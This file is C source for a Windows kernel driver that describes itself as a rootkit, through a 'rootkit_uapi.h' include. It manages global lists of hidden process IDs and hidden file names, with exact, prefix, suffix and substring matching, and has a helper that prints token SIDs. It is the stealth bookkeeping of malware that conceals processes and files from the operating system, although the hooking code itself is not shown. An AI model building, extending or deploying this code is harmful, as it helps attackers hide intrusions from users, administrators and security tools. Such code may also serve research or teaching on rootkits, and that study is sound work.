#include "utils.h"
#include <ntifs.h>
#include <ntstrsafe.h>
#include <wdm.h>
// Include minwindef.h after ntifs.h and wdm.h to avoid redefinition errors
#include <minwindef.h>
#include "shared/rootkit_uapi.h"
#include "structures.h"

HIDDEN_PID gHiddenPidList[HIDDEN_PID_LIST_SIZE];
HIDDEN_FILE gHiddenFileList[HIDDEN_FILE_LIST_SIZE];

NTSTATUS AddHiddenPid(IN DWORD dwPid, IN _PEPROCESS pProc) {
    if (dwPid == 0) {
        return STATUS_INVALID_PARAMETER;  // PID 0 is used for empty slots
    }

    for (DWORD i = 0; i < HIDDEN_PID_LIST_SIZE; ++i) {
        if (gHiddenPidList[i].ProcessId == 0) {
            gHiddenPidList[i].ProcessId = dwPid;
            gHiddenPidList[i].pProc = pProc;
            return STATUS_SUCCESS;
        }
    }
    return STATUS_INSUFFICIENT_RESOURCES;
}

_PEPROCESS GetHiddenPidEprocess(IN DWORD dwPid) {
    PHIDDEN_PID pHiddenPid = NULL;
    if (dwPid == 0) {
        return NULL;
    }

    for (DWORD i = 0; i < HIDDEN_PID_LIST_SIZE; ++i) {
        pHiddenPid = &gHiddenPidList[i];
        if (pHiddenPid->ProcessId == 0) {
            break;  // We reached the end of the list
        }
        if (pHiddenPid->ProcessId == dwPid) {
            return pHiddenPid->pProc;
        }
    }
    return NULL;
}

NTSTATUS RemoveHiddenPid(IN DWORD dwPid) {
    if (dwPid == 0) {
        return STATUS_INVALID_PARAMETER;
    }

    for (DWORD i = 0; i < HIDDEN_PID_LIST_SIZE; ++i) {
        if (gHiddenPidList[i].ProcessId == 0) {
            break;
        }

        if (gHiddenPidList[i].ProcessId == dwPid) {
            for (; i < HIDDEN_PID_LIST_SIZE - 1 && gHiddenPidList[i].ProcessId != 0; ++i) {
                // Shift the next entries left until we reach the end of the list
                gHiddenPidList[i] = gHiddenPidList[i + 1];
            }
            if (i == HIDDEN_PID_LIST_SIZE - 1) {
                // The deleted entry was at the last possible position, so we mark it as empty
                gHiddenPidList[i].ProcessId = 0;
                gHiddenPidList[i].pProc = NULL;
            }
            return STATUS_SUCCESS;
        }
    }
    return STATUS_NOT_FOUND;
}

NTSTATUS AddHiddenFile(IN LPCWSTR lpFileName, IN ULONG ulFileNameLength, IN MATCH_TYPE matchType) {
    if (lpFileName == NULL || ulFileNameLength == 0 ||
        ulFileNameLength > ARRAYSIZE(gHiddenFileList->FileName)) {
        MyDbgPrint("AddHiddenFile: Invalid file name or length (Name: %p, Length: %lu)", lpFileName,
                   ulFileNameLength);
        return STATUS_INVALID_PARAMETER;
    }

    for (DWORD i = 0; i < HIDDEN_FILE_LIST_SIZE; ++i) {
        if (gHiddenFileList[i].FileNameLength == 0) {
            gHiddenFileList[i].FileNameLength = ulFileNameLength;
            gHiddenFileList[i].MatchType = matchType;
            RtlCopyMemory(gHiddenFileList[i].FileName, lpFileName,
                          ulFileNameLength * sizeof(*gHiddenFileList->FileName));
            return STATUS_SUCCESS;
        }
    }
    return STATUS_INSUFFICIENT_RESOURCES;
}

BOOL IsFileHidden(IN LPCWSTR lpFileName, IN ULONG ulFileNameLength) {
    PHIDDEN_FILE pHiddenFile = NULL;
    LPCWSTR lpHiddenName = NULL;
    ULONG ulHiddenLength;
    MATCH_TYPE matchType;

    if (lpFileName == NULL || ulFileNameLength == 0 ||
        ulFileNameLength > ARRAYSIZE(gHiddenFileList->FileName)) {
        MyDbgPrint("IsFileHidden: Invalid file name or length (Name: %p, Length: %lu)", lpFileName,
                   ulFileNameLength);
        return FALSE;
    }

    for (DWORD i = 0; i < HIDDEN_FILE_LIST_SIZE; ++i) {
        pHiddenFile = &gHiddenFileList[i];
        lpHiddenName = pHiddenFile->FileName;
        ulHiddenLength = pHiddenFile->FileNameLength;
        matchType = (MATCH_TYPE)pHiddenFile->MatchType;

        if (ulHiddenLength == 0) {
            MyDbgPrint("IsFileHidden: File isn't hidden");
            break;
        }

        MyDbgPrint("IsFileHidden: Checking %.*ws (%lu) against %.*ws (%lu) [Match type: %ld]",
                   ulFileNameLength, lpFileName, ulFileNameLength, ulHiddenLength, lpHiddenName,
                   ulHiddenLength, matchType);

        switch (matchType) {
            case MATCH_TYPE_EXACT:
                if (ulFileNameLength == ulHiddenLength &&
                    wcsncmp(lpFileName, lpHiddenName, ulHiddenLength) == 0) {
                    MyDbgPrint("IsFileHidden: Exact match found");
                    return TRUE;
                }
                break;

            case MATCH_TYPE_SUBSTRING:
                if (wcsstr(lpFileName, lpHiddenName) != NULL) {
                    MyDbgPrint("IsFileHidden: Substring match found");
                    return TRUE;
                }
                break;

            case MATCH_TYPE_PREFIX:
                if (wcsncmp(lpFileName, lpHiddenName, ulHiddenLength) == 0) {
                    MyDbgPrint("IsFileHidden: Prefix match found");
                    return TRUE;
                }
                break;

            case MATCH_TYPE_SUFFIX:
                if (ulFileNameLength >= ulHiddenLength &&
                    wcsncmp(lpFileName + (ulFileNameLength - ulHiddenLength), lpHiddenName,
                            ulHiddenLength) == 0) {
                    MyDbgPrint("IsFileHidden: Suffix match found");
                    return TRUE;
                }
                break;
        }
    }
    return FALSE;
}

NTSTATUS RemoveHiddenFile(IN LPCWSTR lpFileName, IN ULONG ulFileNameLength) {
    PHIDDEN_FILE pHiddenFile = NULL;
    ULONG ulHiddenLength;

    if (lpFileName == NULL || ulFileNameLength == 0 ||
        ulFileNameLength > ARRAYSIZE(gHiddenFileList->FileName)) {
        return STATUS_INVALID_PARAMETER;
    }

    for (DWORD i = 0; i < HIDDEN_FILE_LIST_SIZE; ++i) {
        pHiddenFile = &gHiddenFileList[i];
        ulHiddenLength = pHiddenFile->FileNameLength;

        if (ulHiddenLength == 0) {
            break;
        }

        if (ulFileNameLength == ulHiddenLength &&
            wcsncmp(lpFileName, pHiddenFile->FileName, ulHiddenLength) == 0) {
            for (; i < HIDDEN_FILE_LIST_SIZE - 1 && gHiddenFileList[i].FileNameLength != 0; ++i) {
                gHiddenFileList[i] = gHiddenFileList[i + 1];
            }
            if (i == HIDDEN_FILE_LIST_SIZE - 1) {
                gHiddenFileList[i].FileNameLength = 0;
                gHiddenFileList[i].MatchType = 0;
                RtlZeroMemory(gHiddenFileList[i].FileName, sizeof(gHiddenFileList->FileName));
            }
            return STATUS_SUCCESS;
        }
    }
    return STATUS_NOT_FOUND;
}

VOID PrintSidInfo(IN CONST SID_AND_ATTRIBUTES* pUserAndGroups, IN ULONG ulUserAndGroupCount) {
    CONST SID* pSid;
    CHAR szSid[256];
    CHAR* pszSidEnd = NULL;

    for (ULONG i = 0; i < ulUserAndGroupCount; ++i) {
        pSid = (PISID)pUserAndGroups[i].Sid;
        ULONGLONG ullAuthority = GetAuthorityValue(&pSid->IdentifierAuthority);
        RtlStringCchPrintfExA(szSid, sizeof(szSid), &pszSidEnd, NULL, STRSAFE_FILL_BEHIND_NULL,
                              "S-%hhd-%llu", pSid->Revision, ullAuthority);
        for (UCHAR k = 0; k < pSid->SubAuthorityCount; ++k) {
            RtlStringCchPrintfExA(pszSidEnd, sizeof(szSid) - (pszSidEnd - szSid), &pszSidEnd, NULL,
                                  STRSAFE_FILL_BEHIND_NULL, "-%lu", pSid->SubAuthority[k]);
        }
        if (i == 0) {
            MyDbgPrint("User SID: %s", szSid);
        } else {
            MyDbgPrint("Group %2lu: %s", i, szSid);
        }
    }
}
